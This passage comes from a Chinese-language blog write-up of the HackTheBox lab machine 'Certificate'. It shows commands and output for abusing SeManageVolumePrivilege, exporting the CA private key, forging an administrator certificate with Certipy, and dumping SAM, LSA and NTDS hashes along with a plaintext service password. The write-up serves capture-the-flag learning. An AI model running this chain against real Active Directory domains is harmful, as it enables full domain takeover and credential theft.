Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Request ID is 35</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;RYAN.K@certificate.htb&#x27;</span></span><br><span class="line">[*] Certificate object SID is <span class="string">&#x27;S-1-5-21-515537669-4223687196-3249690583-1117&#x27;</span></span><br><span class="line">[*] Saving certificate and private key to <span class="string">&#x27;ryan.k.pfx&#x27;</span></span><br><span class="line">[*] Wrote certificate and private key to <span class="string">&#x27;ryan.k.pfx&#x27;</span></span><br><span class="line"></span><br><span class="line">$ faketime -f <span class="string">&quot;+27511s&quot;</span> certipy auth -pfx ryan.k.pfx -username ryan.k -dc-ip 10.10.11.71                        </span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Certificate identities:</span><br><span class="line">[*]     SAN UPN: <span class="string">&#x27;RYAN.K@certificate.htb&#x27;</span></span><br><span class="line">[*]     Security Extension SID: <span class="string">&#x27;S-1-5-21-515537669-4223687196-3249690583-1117&#x27;</span></span><br><span class="line">[*] Using principal: <span class="string">&#x27;ryan.k@certificate.htb&#x27;</span></span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saving credential cache to <span class="string">&#x27;ryan.k.ccache&#x27;</span></span><br><span class="line">[*] Wrote credential cache to <span class="string">&#x27;ryan.k.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;ryan.k&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;ryan.k@certificate.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6</span><br></pre></td></tr></table></figure>
<h2 id="shell-as-ryan-k"><a href="#shell-as-ryan-k" class="headerlink" title="shell as ryan.k"></a>shell as ryan.k</h2><h3 id="SeManageVolumeExploit-exe-and-Gloden-Certificate-Attack"><a href="#SeManageVolumeExploit-exe-and-Gloden-Certificate-Attack" class="headerlink" title="SeManageVolumeExploit.exe and Gloden Certificate Attack"></a>SeManageVolumeExploit.exe and Gloden Certificate Attack</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Ryan.K&gt; <span class="built_in">whoami</span> /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                      State</span><br><span class="line">============================= ================================ =======</span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain       Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking         Enabled</span><br><span class="line">SeManageVolumePrivilege       Perform volume maintenance tasks Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="built_in">set</span>   Enabled</span><br></pre></td></tr></table></figure>
<p>有一个<code>SeManageVolumePrivilege</code>，找一下Google问问，这是允许特定的卷级管理操作权限，滥用可以修改卷级访问控制<br>找到一个<a target="_blank" rel="noopener" href="https://github.com/CsEnox/SeManageVolumeExploit">exploit</a>，下载一下上传上去</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\xxx&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\xxx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----         6/4/2025   3:43 AM          12288 SeManageVolumeExploit.exe</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\xxx&gt; .\SeManageVolumeExploit.exe</span><br><span class="line">Entries changed: 866</span><br><span class="line"></span><br><span class="line">DONE</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\xxx&gt; icacls C:\</span><br><span class="line">C:\ NT AUTHORITY\SYSTEM:(OI)(CI)(F)</span><br><span class="line">    BUILTIN\Users:(OI)(CI)(F)</span><br><span class="line">    BUILTIN\Pre-Windows 2000 Compatible Access:(OI)(CI)(RX)</span><br><span class="line">    BUILTIN\Pre-Windows 2000 Compatible Access:(CI)(AD)</span><br><span class="line">    BUILTIN\Pre-Windows 2000 Compatible Access:(CI)(IO)(WD)</span><br><span class="line">    CREATOR OWNER:(OI)(CI)(IO)(F)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br><span class="line">*Evil-WinRM* PS C:\xxx&gt; icacls C:\Windows\system32</span><br><span class="line">C:\Windows\system32 NT SERVICE\TrustedInstaller:(F)</span><br><span class="line">                    NT SERVICE\TrustedInstaller:(CI)(IO)(F)</span><br><span class="line">                    NT AUTHORITY\SYSTEM:(M)</span><br><span class="line">                    NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)</span><br><span class="line">                    BUILTIN\Users:(M)</span><br><span class="line">                    BUILTIN\Users:(OI)(CI)(IO)(F)</span><br><span class="line">                    BUILTIN\Pre-Windows 2000 Compatible Access:(RX)</span><br><span class="line">                    BUILTIN\Pre-Windows 2000 Compatible Access:(OI)(CI)(IO)(GR,GE)</span><br><span class="line">                    CREATOR OWNER:(OI)(CI)(IO)(F)</span><br><span class="line">                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)</span><br><span class="line">                    APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)</span><br><span class="line">                    APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)</span><br><span class="line">                    APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></table></figure>
<p>机器是跟证书有关系，找一下可不可以拿到根证书</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a--s-        11/3/2024   7:24 PM           2269 46f11b4056ad38609b08d1dea6880023_7989b711-2e3f-4107-9aae-fb8df2e3b958</span><br><span class="line">-a--s-        11/3/2024   8:03 PM           2232 6de9cb26d2b98c01ec4e9e8b34824aa2_7989b711-2e3f-4107-9aae-fb8df2e3b958</span><br><span class="line">-a--s-        11/3/2024   8:03 PM           2222 76944fb33636aeddb9590521c2e8815a_7989b711-2e3f-4107-9aae-fb8df2e3b958</span><br><span class="line">-a--s-        11/3/2024   8:03 PM           2241 d6d986f09a1ee04e24c949879fdb506c_7989b711-2e3f-4107-9aae-fb8df2e3b958</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys&gt; icacls C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys</span><br><span class="line">C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys Everyone:(R,W)</span><br><span class="line">                                                BUILTIN\Administrators:(F)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br><span class="line">*Evil-WinRM* PS C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys&gt; . C:\xxx\SeManageVolumeExploit.exe</span><br><span class="line">Entries changed: 867</span><br><span class="line"></span><br><span class="line">DONE</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys&gt; icacls C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys</span><br><span class="line">C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys Everyone:(R,W)</span><br><span class="line">                                                BUILTIN\Users:(F)</span><br><span class="line"></span><br><span class="line">Successfully processed 1 files; Failed processing 0 files</span><br></pre></td></tr></table></figure>
<p>看一下有没有根证书以及序列号（唯一标识符）<br><img src="/images/certificate-24.png"><br>导出来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Programdata\microsoft\crypto\rsa\machinekeys&gt; certutil -exportpfx <span class="string">&#x27;75b2f4bbf31f108945147b466131bdca&#x27;</span> ca.pfx</span><br><span class="line">MY <span class="string">&quot;Personal&quot;</span></span><br><span class="line">================ Certificate 2 ================</span><br><span class="line">Serial Number: 75b2f4bbf31f108945147b466131bdca</span><br><span class="line">Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb</span><br><span class="line"> NotBefore: 11/3/2024 3:55 PM</span><br><span class="line"> NotAfter: 11/3/2034 4:05 PM</span><br><span class="line">Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb</span><br><span class="line">Certificate Template Name (Certificate Type): CA</span><br><span class="line">CA Version: V0.0</span><br><span class="line">Signature matches Public Key</span><br><span class="line">Root Certificate: Subject matches Issuer</span><br><span class="line">Template: CA, Root Certification Authority</span><br><span class="line">Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8</span><br><span class="line">  Key Container = Certificate-LTD-CA</span><br><span class="line">  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958</span><br><span class="line">  Provider = Microsoft Software Key Storage Provider</span><br><span class="line">Signature <span class="built_in">test</span> passed</span><br><span class="line">Enter new password <span class="keyword">for</span> output file ca.pfx:</span><br><span class="line">Enter new password:</span><br><span class="line">Confirm new password:</span><br><span class="line">CertUtil: -exportPFX <span class="built_in">command</span> completed successfully.</span><br><span class="line">*Evil-WinRM* PS C:\Programdata\microsoft\crypto\rsa\machinekeys&gt; download ca.pfx</span><br><span class="line">                                        </span><br><span class="line">Info: Downloading C:\Programdata\microsoft\crypto\rsa\machinekeys\ca.pfx to ca.pfx</span><br><span class="line">                                        </span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>
<p>本地签发一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ faketime -f <span class="string">&quot;+27511s&quot;</span> certipy forge -ca-pfx ca.pfx -upn administrator@certificate.htb -subject <span class="string">&#x27;CN=Administrator,CN=Users,DC=CERTIFICATE,DC=HTB&#x27;</span>  </span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Saving forged certificate and private key to <span class="string">&#x27;administrator_forged.pfx&#x27;</span></span><br><span class="line">[*] Wrote forged certificate and private key to <span class="string">&#x27;administrator_forged.pfx&#x27;</span></span><br><span class="line"></span><br><span class="line">$ faketime -f <span class="string">&quot;+27511s&quot;</span> certipy auth -pfx administrator_forged.pfx -username administrator -dc-ip 10.10.11.71                                      </span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Certificate identities:</span><br><span class="line">[*]     SAN UPN: <span class="string">&#x27;administrator@certificate.htb&#x27;</span></span><br><span class="line">[*] Using principal: <span class="string">&#x27;administrator@certificate.htb&#x27;</span></span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saving credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Wrote credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator@certificate.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6</span><br></pre></td></tr></table></figure>
<p>got root</p>
<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra</span><br><span class="line"></span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0x5cea1e66da8824f09a4e388596e60a4a</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:60f6b8c46a9c6d8e0635b619c069b2ae:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[-] SAM hashes extraction <span class="keyword">for</span> user WDAGUtilityAccount failed. The account doesn<span class="string">&#x27;t have hash information.</span></span><br><span class="line"><span class="string">[*] Dumping cached domain logon information (domain/username:hash)</span></span><br><span class="line"><span class="string">[*] Dumping LSA Secrets</span></span><br><span class="line"><span class="string">[*] $MACHINE.ACC </span></span><br><span class="line"><span class="string">CERTIFICATE\DC01$:aes256-cts-hmac-sha1-96:37e0e73332edfcc623b54ae20124ba786f453d664b05c950e19957b01aa82226</span></span><br><span class="line"><span class="string">CERTIFICATE\DC01$:aes128-cts-hmac-sha1-96:cb4b0249daf270bce4f51db03e407c38</span></span><br><span class="line"><span class="string">CERTIFICATE\DC01$:des-cbc-md5:0219c23d986eefb0</span></span><br><span class="line"><span class="string">CERTIFICATE\DC01$:plain_password_hex:b9e738a3d3c27735c6c2e77c4718f2434791aa8de0ccd96c4570de531c91fc7c96973fef80e4cbc9f9a00217923216eb5c2f6e64699f0d53c97f5f44d40e40cb4d4cbb8a7e3e85eefce6b72c43740e5a5a87a83a041e5bca193771025752807f8db1a666382fcabb9eca24822746fb5197638ef3515a9a8e7ea3b48a6656bc9152e0a9167026cf36961a320806768ab02438a4444efdcd043cf1a3d3f78152006ea52e5dae8364b7f64f9dacca923478bfbd24686af0a907a531e5329f1e8ce95d0b9da1513f6637fd34084e06dc93a1fd2e36d74aab657e2bdf0ac00352a3085ff70f2dd53e21c160e99a11960cebdf</span></span><br><span class="line"><span class="string">CERTIFICATE\DC01$:aad3b435b51404eeaad3b435b51404ee:f36e0bc3c9a34c3acdb8b79df54f27cd:::</span></span><br><span class="line"><span class="string">[*] DPAPI_SYSTEM </span></span><br><span class="line"><span class="string">dpapi_machinekey:0xc3ff4e4015e130aeac8a1230c29c6cd80a123f75</span></span><br><span class="line"><span class="string">dpapi_userkey:0x36a4f4aae2cdbee83d6abfc5e9d546d09e8eaf04</span></span><br><span class="line"><span class="string">[*] NL$KM </span></span><br><span class="line"><span class="string"> 0000   DB 80 E3 7D 2D F9 3B 06  ED DB EC 4B 5B 13 1C 1E   ...&#125;-.;....K[...</span></span><br><span class="line"><span class="string"> 0010   18 0E 97 5D 3E A9 50 81  F9 92 9A 32 97 BC FB 94   ...]&gt;.P....2....</span></span><br><span class="line"><span class="string"> 0020   D0 69 3D C3 70 3C BD 83  AE 53 66 03 3C E7 DB 69   .i=.p&lt;...Sf.&lt;..i</span></span><br><span class="line"><span class="string"> 0030   CF F4 A1 16 B2 58 38 56  2E CF E8 8F 38 51 A3 EE   .....X8V....8Q..</span></span><br><span class="line"><span class="string">NL$KM:db80e37d2df93b06eddbec4b5b131c1e180e975d3ea95081f9929a3297bcfb94d0693dc3703cbd83ae5366033ce7db69cff4a116b25838562ecfe88f3851a3ee</span></span><br><span class="line"><span class="string">[*] _SC_Apache2.4                                                                                                                                                                            </span></span><br><span class="line"><span class="string">CERTIFICATE\xamppuser:x@mppUserPwd!                                                           </span></span><br><span class="line"><span class="string">[*] _SC_mysql                                                                                                                                                                                </span></span><br><span class="line"><span class="string">CERTIFICATE\xamppuser:x@mppUserPwd!                                                                                                                                                          </span></span><br><span class="line"><span class="string">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                </span></span><br><span class="line"><span class="string">[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                         </span></span><br><span class="line"><span class="string">Administrator:500:aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6:::                                                                                                       </span></span><br><span class="line"><span class="string">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                </span></span><br><span class="line"><span class="string">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9de0f65ce37b57bc0a8fce1f9d4402c7:::                                                                                                              </span></span><br><span class="line"><span class="string">Kai.X:1105:aad3b435b51404eeaad3b435b51404ee:003c4c38e98c78352362095a6028f720:::                                                                                                              </span></span><br><span class="line"><span class="string">Sara.B:1109:aad3b435b51404eeaad3b435b51404ee:c2367169e3279fa3e85d9d25f0e85e45:::     </span></span><br><span class="line"><span class="string">John.C:1111:aad3b435b51404eeaad3b435b51404ee:3f6d0e5bbf21d7f1c72a8eebc82547f5:::                                                                                                             </span></span><br><span class="line"><span class="string">Aya.W:1112:aad3b435b51404eeaad3b435b51404ee:a72e757f0f5859819e90d1a71666f933:::                                                                                                              </span></span><br><span class="line"><span class="string">Nya.S:1113:aad3b435b51404eeaad3b435b51404ee:a72e757f0f5859819e90d1a71666f933:::</span></span><br><span class="line"><span class="string">Maya.K:1114:aad3b435b51404eeaad3b435b51404ee:a72e757f0f5859819e90d1a71666f933:::                                                                                                             </span></span><br><span class="line"><span class="string">Lion.SK:1115:aad3b435b51404eeaad3b435b51404ee:3b24c391862f4a8531a245a0217708c4:::                                                                                                            </span></span><br><span class="line"><span class="string">Eva.F:1116:aad3b435b51404eeaad3b435b51404ee:f30914c4b456ef5691bf24b50b332e99:::                                                                                                              </span></span><br><span class="line"><span class="string">Ryan.K:1117:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::                                                                                                             </span></span><br><span class="line"><span class="string">certificate.htb\akeder.kh:1119:aad3b435b51404eeaad3b435b51404ee:9ca9ba1e46bd75574002b8b1967bb2de:::</span></span><br><span class="line"><span class="string">kara.m:1121:aad3b435b51404eeaad3b435b51404ee:831a13eb0ff31d5b80eb062f24bfb210:::              </span></span><br><span class="line"><span class="string">Alex.D:1124:aad3b435b51404eeaad3b435b51404ee:32be964c0519ef40083157825c7949ca:::                                                                                                             </span></span><br><span class="line"><span class="string">certificate.htb\karol.s:1127:aad3b435b51404eeaad3b435b51404ee:a242ea4fbd87f0feff1203bad168b770:::</span></span><br><span class="line"><span class="string">saad.m:1128:aad3b435b51404eeaad3b435b51404ee:a242ea4fbd87f0feff1203bad168b770:::              </span></span><br><span class="line"><span class="string">xamppuser:1130:aad3b435b51404eeaad3b435b51404ee:ed547ca356c218f5e76c2640fc3429ab:::                                                                                                          </span></span><br><span class="line"><span class="string">DC01$:1000:aad3b435b51404eeaad3b435b51404ee:f36e0bc3c9a34c3acdb8b79df54f27cd:::                                                                                                              </span></span><br><span class="line"><span class="string">WS-01$:1103:aad3b435b51404eeaad3b435b51404ee:3641f1cd0daa8dfe41e1d1b2dbbed6f4:::</span></span><br><span class="line"><span class="string">WS-05$:1131:aad3b435b51404eeaad3b435b51404ee:eae20b8c895e7ac2e1a4870f71738058:::</span></span><br><span class="line"><span class="string">[*] Kerberos keys grabbed</span></span><br></pre></td></tr></table></figure>

    
  </div>

  
  <!-- Post Copyright -->

<div class="post-copyright">
  <p class="copyright-item">
    <span>Author: </span>
    <a href="https://n0nome.github.io">n0nome</a>
  </p>
  <p class="copyright-item">
    <span>Link: </span>
    <a href="https://n0nome.github.io/2025/06/19/Certificate/Certificate/">https://n0nome.github.io/2025/06/19/Certificate/Certificate/</a>
  </p>
  <p class="copyright-item">
    <span>License: </span>
    
    <a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
  </p>
</div>

    

  

  
  <footer class="post-footer">
    
    <div class="post-tags">
      
      <a href="/tags/writeup/">writeup</a>
      
    </div>
    
      
  <nav class="post-nav">  
      
      <a class="prev" href="/2025/06/19/ElectricBreeze-1/ElectricBreeze-1/">  
        <i class="iconfont icon-left"></i>  
        <span class="prev-text nav-default">HackTheBox——SherLocks ElectricBreeze-1 Writeup</span>  
        <span class="prev-text nav-mobile">Prev</span>  
      </a>  
      
      
      <a class="next" href="/2025/06/19/Athena%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95%E8%A1%A5%E6%A1%A3/Athena%E7%BB%B4%E4%BF%AE%E8%AE%B0%E5%BD%95%E8%A1%A5%E6%A1%A3/">  
        <span class="next-text nav-default">Athena维修记录补档</span>  
        <span class="prev-text nav-mobile">Next</span>  
        <i class="iconfont icon-right"></i>  
      </a>  
      
  </nav>  
  

  </footer>
  

</article>
        </div>
          
  <div class="comments" id="comments">  
      
  </div>  
  

      </div>
    </main>
    <footer id="footer" class="footer">
      <!-- Social Links -->

<div class="social-links">
  
  
  
  
  <a href="mailto:your@email.com" class="iconfont icon-email" title="email"></a>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <a target="_blank" rel="noopener" href="https://github.com/ahonn" class="iconfont icon-github" title="github"></a>
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  

  
  
  <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
  
</div>



<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme -
    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>
  <span class="division">|</span>
  <span class="hosting-info">
    footer.hosting
  </span>

  <span class="copyright-year">
    <span>
      
      &copy;
      
      2024 - 2025      
    </span>

    <span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>

    <span class="author">n0nome</span>
  </span>

</div>
    </footer>
    <div class="back-to-top" id="back-to-top"> <i class="iconfont icon-up"></i> </div>
  </div>
    
    
    
    
    
    
    
  

  







<script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>



<script type="text/javascript" src="/lib/slideout/slideout.js"></script>



<script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>



  <script type="text/javascript" src="/js/src/even.js?v=3.0.0"></script>
</body>

</html>